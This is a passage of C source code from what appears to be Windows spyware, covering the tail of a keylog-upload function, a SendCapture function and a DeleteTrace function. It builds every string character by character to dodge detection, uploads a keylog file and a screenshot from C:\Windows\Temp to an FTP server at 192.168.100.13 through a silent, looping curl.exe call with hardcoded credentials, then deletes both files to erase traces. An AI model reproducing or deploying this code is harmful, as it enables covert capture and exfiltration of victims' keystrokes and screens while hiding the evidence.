	char part_string_6_6[] = "s";
	char part_string_6_7[] = "e";
	char part_string_6_8[] = "r";
	char part_string_6_9[] = ":";
	char part_string_6_10[] = "1";
	char part_string_6_11[] = "2";
	char part_string_6_12[] = "3";
	strcpy_s(full_string_6, sizeof(full_string_6), part_string_6_1);
	strcat_s(full_string_6, sizeof(full_string_6), part_string_6_2);
	strcat_s(full_string_6, sizeof(full_string_6), part_string_6_3);
	strcat_s(full_string_6, sizeof(full_string_6), part_string_6_4);
	strcat_s(full_string_6, sizeof(full_string_6), part_string_6_5);
	strcat_s(full_string_6, sizeof(full_string_6), part_string_6_6);
	strcat_s(full_string_6, sizeof(full_string_6), part_string_6_7);
	strcat_s(full_string_6, sizeof(full_string_6), part_string_6_8);
	strcat_s(full_string_6, sizeof(full_string_6), part_string_6_9);
	strcat_s(full_string_6, sizeof(full_string_6), part_string_6_10);
	strcat_s(full_string_6, sizeof(full_string_6), part_string_6_11);
	strcat_s(full_string_6, sizeof(full_string_6), part_string_6_12);

	char full_string_7[100];	// --ftp-ssl-reqd
	char part_string_7_1[] = "--f";
	char part_string_7_2[] = "t";
	char part_string_7_3[] = "p";
	char part_string_7_4[] = "-";
	char part_string_7_5[] = "s";
	char part_string_7_6[] = "s";
	char part_string_7_7[] = "l";
	char part_string_7_8[] = "-";
	char part_string_7_9[] = "r";
	char part_string_7_10[] = "e";
	char part_string_7_11[] = "q";
	char part_string_7_12[] = "d";
	strcpy_s(full_string_7, sizeof(full_string_7), part_string_7_1);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_2);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_3);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_4);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_5);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_6);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_7);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_8);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_9);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_10);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_11);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_12);


	char full_string_8[100];	// curl.exe
	char part_string_8_1[] = "c";
	char part_string_8_2[] = "u";
	char part_string_8_3[] = "r";
	char part_string_8_4[] = "l";
	char part_string_8_5[] = ".";
	char part_string_8_6[] = "e";
	char part_string_8_7[] = "x";
	char part_string_8_8[] = "e";
	strcpy_s(full_string_8, sizeof(full_string_8), part_string_8_1);
	strcat_s(full_string_8, sizeof(full_string_8), part_string_8_2);
	strcat_s(full_string_8, sizeof(full_string_8), part_string_8_3);
	strcat_s(full_string_8, sizeof(full_string_8), part_string_8_4);
	strcat_s(full_string_8, sizeof(full_string_8), part_string_8_5);
	strcat_s(full_string_8, sizeof(full_string_8), part_string_8_6);
	strcat_s(full_string_8, sizeof(full_string_8), part_string_8_7);
	strcat_s(full_string_8, sizeof(full_string_8), part_string_8_8);

	char full_string_9[4];	// -u for --user
	char part_string_9_1[] = "-";
	char part_string_9_2[] = "u";
	strcpy_s(full_string_9, sizeof(full_string_9), part_string_9_1);
	strcat_s(full_string_9, sizeof(full_string_9), part_string_9_2);

	char full_string_10[4];	// -k for --insecure
	char part_string_10_1[] = "-";
	char part_string_10_2[] = "k";
	strcpy_s(full_string_10, sizeof(full_string_10), part_string_10_1);
	strcat_s(full_string_10, sizeof(full_string_10), part_string_10_2);

	char full_string_11[4];	// -s for --silent
	char part_string_11_1[] = "-";
	char part_string_11_2[] = "s";
	strcpy_s(full_string_11, sizeof(full_string_11), part_string_11_1);
	strcat_s(full_string_11, sizeof(full_string_11), part_string_11_2);



	char curlCommand[512];

	//curl --ftp-ssl-reqd -T test_ftp_ssl.txt -u "ftp_user:123" "ftp://192.168.100.13/uploads/test_ftp_ssl.txt" -k -s
	snprintf(curlCommand, sizeof(curlCommand),
		"%s %s -T \"%s\" %s://%s/%s/%s %s \"%s\" %s %s",
		full_string_8, full_string_7, full_string_2, full_string_3, full_string_4, full_string_5, full_string_1, full_string_9, full_string_6, full_string_10, full_string_11);

	
	//printf("[+] FTP command -> %s\n", curlCommand);
	int result;
	do {
		//printf("[+] keylog file sent to ftp server\n");
		result = system(curlCommand);
		if (result == 26) {return 26;}
	} while (result != 0);

	return 0;
}
int SendCapture(void) {

	char ScreenCaptureFileName[500];  //	C:\\Windows\\Temp\\screenshot.bmp
	char part_ScreenCaptureFileName_1[] = "C";
	char part_ScreenCaptureFileName_2[] = ":";
	char part_ScreenCaptureFileName_3[] = "\\";
	char part_ScreenCaptureFileName_4[] = "Wi";
	char part_ScreenCaptureFileName_5[] = "nd";
	char part_ScreenCaptureFileName_6[] = "ow";
	char part_ScreenCaptureFileName_7[] = "s\\";
	char part_ScreenCaptureFileName_8[] = "T";
	char part_ScreenCaptureFileName_9[] = "e";
	char part_ScreenCaptureFileName_10[] = "mp";
	char part_ScreenCaptureFileName_11[] = "\\";
	char part_ScreenCaptureFileName_12[] = "s";
	char part_ScreenCaptureFileName_13[] = "c";
	char part_ScreenCaptureFileName_14[] = "r";
	char part_ScreenCaptureFileName_15[] = "ee";
	char part_ScreenCaptureFileName_16[] = "n";
	char part_ScreenCaptureFileName_17[] = "s";
	char part_ScreenCaptureFileName_18[] = "h";
	char part_ScreenCaptureFileName_19[] = "o";
	char part_ScreenCaptureFileName_20[] = "t";
	char part_ScreenCaptureFileName_21[] = ".b";
	char part_ScreenCaptureFileName_22[] = "mp";
	strcpy_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_1);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_2);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_3);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_4);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_5);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_6);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_7);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_8);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_9);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_10);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_11);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_12);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_13);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_14);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_15);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_16);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_17);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_18);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_19);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_20);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_21);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_22);

	char full_string_1[100];	// screenshot.bmp -> remote file name
	char part_string_1_1[] = "s";
	char part_string_1_2[] = "c";
	char part_string_1_3[] = "r";
	char part_string_1_4[] = "e";
	char part_string_1_5[] = "e";
	char part_string_1_6[] = "n";
	char part_string_1_7[] = "s";
	char part_string_1_8[] = "h";
	char part_string_1_9[] = "o";
	char part_string_1_10[] = "t.";
	char part_string_1_11[] = "b";
	char part_string_1_12[] = "mp";
	strcpy_s(full_string_1, sizeof(full_string_1), part_string_1_1);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_2);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_3);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_4);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_5);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_6);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_7);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_8);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_9);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_10);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_11);
	strcat_s(full_string_1, sizeof(full_string_1), part_string_1_12);


	char full_string_3[5];	// ftp
	char part_string_3_1[] = "f";
	char part_string_3_2[] = "t";
	char part_string_3_3[] = "p";
	strcpy_s(full_string_3, sizeof(full_string_3), part_string_3_1);
	strcat_s(full_string_3, sizeof(full_string_3), part_string_3_2);
	strcat_s(full_string_3, sizeof(full_string_3), part_string_3_3);
	


	char full_string_4[100];	// 192.168.100.13
	char part_string_4_1[] = "1";
	char part_string_4_2[] = "9";
	char part_string_4_3[] = "2.";
	char part_string_4_4[] = "1";
	char part_string_4_5[] = "6";
	char part_string_4_6[] = "8";
	char part_string_4_7[] = ".";
	char part_string_4_8[] = "1";
	char part_string_4_9[] = "0";
	char part_string_4_10[] = "0.";
	char part_string_4_11[] = "1";
	char part_string_4_12[] = "3";
	strcpy_s(full_string_4, sizeof(full_string_4), part_string_4_1);
	strcat_s(full_string_4, sizeof(full_string_4) ,part_string_4_2);
	strcat_s(full_string_4, sizeof(full_string_4) ,part_string_4_3);
	strcat_s(full_string_4, sizeof(full_string_4) ,part_string_4_4);
	strcat_s(full_string_4, sizeof(full_string_4) ,part_string_4_5);
	strcat_s(full_string_4, sizeof(full_string_4) ,part_string_4_6);
	strcat_s(full_string_4, sizeof(full_string_4) ,part_string_4_7);
	strcat_s(full_string_4, sizeof(full_string_4) ,part_string_4_8);
	strcat_s(full_string_4, sizeof(full_string_4) ,part_string_4_9);
	strcat_s(full_string_4, sizeof(full_string_4) ,part_string_4_10);
	strcat_s(full_string_4, sizeof(full_string_4) ,part_string_4_11);
	strcat_s(full_string_4, sizeof(full_string_4) ,part_string_4_12);

	char full_string_5[100];	// uploads
	char part_string_5_1[] = "u";
	char part_string_5_2[] = "p";
	char part_string_5_3[] = "l";
	char part_string_5_4[] = "o";
	char part_string_5_5[] = "a";
	char part_string_5_6[] = "d";
	char part_string_5_7[] = "s";
	strcpy_s(full_string_5, sizeof(full_string_5) ,part_string_5_1);
	strcat_s(full_string_5, sizeof(full_string_5) ,part_string_5_2);
	strcat_s(full_string_5, sizeof(full_string_5) ,part_string_5_3);
	strcat_s(full_string_5, sizeof(full_string_5) ,part_string_5_4);
	strcat_s(full_string_5, sizeof(full_string_5) ,part_string_5_5);
	strcat_s(full_string_5, sizeof(full_string_5) ,part_string_5_6);
	strcat_s(full_string_5, sizeof(full_string_5) ,part_string_5_7);

	char full_string_6[100];	// ftp_user:123
	char part_string_6_1[] = "f";
	char part_string_6_2[] = "t";
	char part_string_6_3[] = "p";
	char part_string_6_4[] = "_";
	char part_string_6_5[] = "u";
	char part_string_6_6[] = "s";
	char part_string_6_7[] = "e";
	char part_string_6_8[] = "r";
	char part_string_6_9[] = ":";
	char part_string_6_10[] = "1";
	char part_string_6_11[] = "2";
	char part_string_6_12[] = "3";
	strcpy_s(full_string_6, sizeof(full_string_6) , part_string_6_1);
	strcat_s(full_string_6, sizeof(full_string_6) , part_string_6_2);
	strcat_s(full_string_6, sizeof(full_string_6) , part_string_6_3);
	strcat_s(full_string_6, sizeof(full_string_6) , part_string_6_4);
	strcat_s(full_string_6, sizeof(full_string_6) , part_string_6_5);
	strcat_s(full_string_6, sizeof(full_string_6) , part_string_6_6);
	strcat_s(full_string_6, sizeof(full_string_6) , part_string_6_7);
	strcat_s(full_string_6, sizeof(full_string_6) , part_string_6_8);
	strcat_s(full_string_6, sizeof(full_string_6) , part_string_6_9);
	strcat_s(full_string_6, sizeof(full_string_6) , part_string_6_10);
	strcat_s(full_string_6, sizeof(full_string_6) , part_string_6_11);
	strcat_s(full_string_6, sizeof(full_string_6) , part_string_6_12);

	char full_string_7[100];	// --ftp-ssl-reqd
	char part_string_7_1[] = "--f";
	char part_string_7_2[] = "t";
	char part_string_7_3[] = "p";
	char part_string_7_4[] = "-";
	char part_string_7_5[] = "s";
	char part_string_7_6[] = "s";
	char part_string_7_7[] = "l";
	char part_string_7_8[] = "-";
	char part_string_7_9[] = "r";
	char part_string_7_10[] = "e";
	char part_string_7_11[] = "q";
	char part_string_7_12[] = "d";
	strcpy_s(full_string_7, sizeof(full_string_7) ,part_string_7_1);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_2);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_3);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_4);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_5);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_6);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_7);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_8);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_9);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_10);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_11);
	strcat_s(full_string_7, sizeof(full_string_7), part_string_7_12);


	char full_string_8[100];	// curl.exe
	char part_string_8_1[] = "c";
	char part_string_8_2[] = "u";
	char part_string_8_3[] = "r";
	char part_string_8_4[] = "l";
	char part_string_8_5[] = ".";
	char part_string_8_6[] = "e";
	char part_string_8_7[] = "x";
	char part_string_8_8[] = "e";
	strcpy_s(full_string_8, sizeof(full_string_8), part_string_8_1);
	strcat_s(full_string_8, sizeof(full_string_8) ,part_string_8_2);
	strcat_s(full_string_8, sizeof(full_string_8) ,part_string_8_3);
	strcat_s(full_string_8, sizeof(full_string_8) ,part_string_8_4);
	strcat_s(full_string_8, sizeof(full_string_8) ,part_string_8_5);
	strcat_s(full_string_8, sizeof(full_string_8) ,part_string_8_6);
	strcat_s(full_string_8, sizeof(full_string_8) ,part_string_8_7);
	strcat_s(full_string_8, sizeof(full_string_8) ,part_string_8_8);

	char full_string_9[4];	// -u for --user
	char part_string_9_1[] = "-";
	char part_string_9_2[] = "u";
	strcpy_s(full_string_9, sizeof(full_string_9), part_string_9_1);
	strcat_s(full_string_9, sizeof(full_string_9), part_string_9_2);

	char full_string_10[4];	// -k for --insecure
	char part_string_10_1[] = "-";
	char part_string_10_2[] = "k";
	strcpy_s(full_string_10, sizeof(full_string_10),part_string_10_1);
	strcat_s(full_string_10, sizeof(full_string_10),part_string_10_2);

	char full_string_11[4];	// -s for --silent
	char part_string_11_1[] = "-";
	char part_string_11_2[] = "s";
	strcpy_s(full_string_11, sizeof(full_string_11),part_string_11_1);
	strcat_s(full_string_11, sizeof(full_string_11),part_string_11_2);



	char curlCommand[1000];

	//curl --ftp-ssl-reqd -T \\path\\to\\test_ftp_ssl.txt "ftp://192.168.8.161/uploads/test_ftp_ssl.txt" -u "ftp_user:123"  -k -s
	snprintf(curlCommand, sizeof(curlCommand),
		"%s %s -T \"%s\" %s://%s/%s/%s %s \"%s\" %s %s",
		full_string_8, full_string_7, ScreenCaptureFileName, full_string_3, full_string_4, full_string_5, full_string_1, full_string_9, full_string_6, full_string_10, full_string_11);

	//printf("[+] FTP command -> %s\n",curlCommand);	
	int result;
	do {
		//printf("[+] screenshot sent to ftp server\n");
		result = system(curlCommand);
		if (result == 26) { return 26; }
	} while (result != 0);
	
	return 0;
}

void DeleteTrace(void) {



	char KeylogFileName[100];	// C:\\Windows\\Temp\\log.log
	char part_KeylogFileName_1[] = "";
	char part_KeylogFileName_2[] = "";
	char part_KeylogFileName_3[] = "";
	char part_KeylogFileName_4[] = "C";
	char part_KeylogFileName_5[] = ":";
	char part_KeylogFileName_6[] = "\\";
	char part_KeylogFileName_7[] = "Wi";
	char part_KeylogFileName_8[] = "nd";
	char part_KeylogFileName_9[] = "ow";
	char part_KeylogFileName_10[] = "s\\";
	char part_KeylogFileName_11[] = "T";
	char part_KeylogFileName_12[] = "e";
	char part_KeylogFileName_13[] = "mp\\";
	char part_KeylogFileName_14[] = "l";
	char part_KeylogFileName_15[] = "o";
	char part_KeylogFileName_16[] = "g";
	char part_KeylogFileName_17[] = ".";
	char part_KeylogFileName_18[] = "l";
	char part_KeylogFileName_19[] = "o";
	char part_KeylogFileName_20[] = "g";
	strcpy_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_1);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_2);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_3);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_4);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_5);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_6);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_7);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_8);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_9);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_10);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_11);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_12);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_13);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_14);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_15);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_16);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_17);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_18);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_19);
	strcat_s(KeylogFileName, sizeof(KeylogFileName), part_KeylogFileName_20);


	char ScreenCaptureFileName[500];  //	C:\\Windows\\Temp\\screenshot.bmp
	char part_ScreenCaptureFileName_1[] = "C";
	char part_ScreenCaptureFileName_2[] = ":";
	char part_ScreenCaptureFileName_3[] = "\\";
	char part_ScreenCaptureFileName_4[] = "Wi";
	char part_ScreenCaptureFileName_5[] = "nd";
	char part_ScreenCaptureFileName_6[] = "ow";
	char part_ScreenCaptureFileName_7[] = "s\\";
	char part_ScreenCaptureFileName_8[] = "T";
	char part_ScreenCaptureFileName_9[] = "e";
	char part_ScreenCaptureFileName_10[] = "mp";
	char part_ScreenCaptureFileName_11[] = "\\";
	char part_ScreenCaptureFileName_12[] = "s";
	char part_ScreenCaptureFileName_13[] = "c";
	char part_ScreenCaptureFileName_14[] = "r";
	char part_ScreenCaptureFileName_15[] = "ee";
	char part_ScreenCaptureFileName_16[] = "n";
	char part_ScreenCaptureFileName_17[] = "s";
	char part_ScreenCaptureFileName_18[] = "h";
	char part_ScreenCaptureFileName_19[] = "o";
	char part_ScreenCaptureFileName_20[] = "t";
	char part_ScreenCaptureFileName_21[] = ".b";
	char part_ScreenCaptureFileName_22[] = "mp";
	strcpy_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_1);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_2);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_3);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_4);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_5);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_6);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_7);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_8);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_9);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_10);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_11);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_12);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_13);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_14);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_15);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_16);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_17);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_18);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_19);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_20);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_21);
	strcat_s(ScreenCaptureFileName, sizeof(ScreenCaptureFileName), part_ScreenCaptureFileName_22);

	/*
	if (remove(KeylogFileName) != 0) { printf("[x] cant delete keylog file\n"); }
	if (remove(ScreenCaptureFileName) != 0) { printf("[x] cant delete screenshot file\n"); }
	*/

	remove(KeylogFileName);
	remove(ScreenCaptureFileName);


	return;
}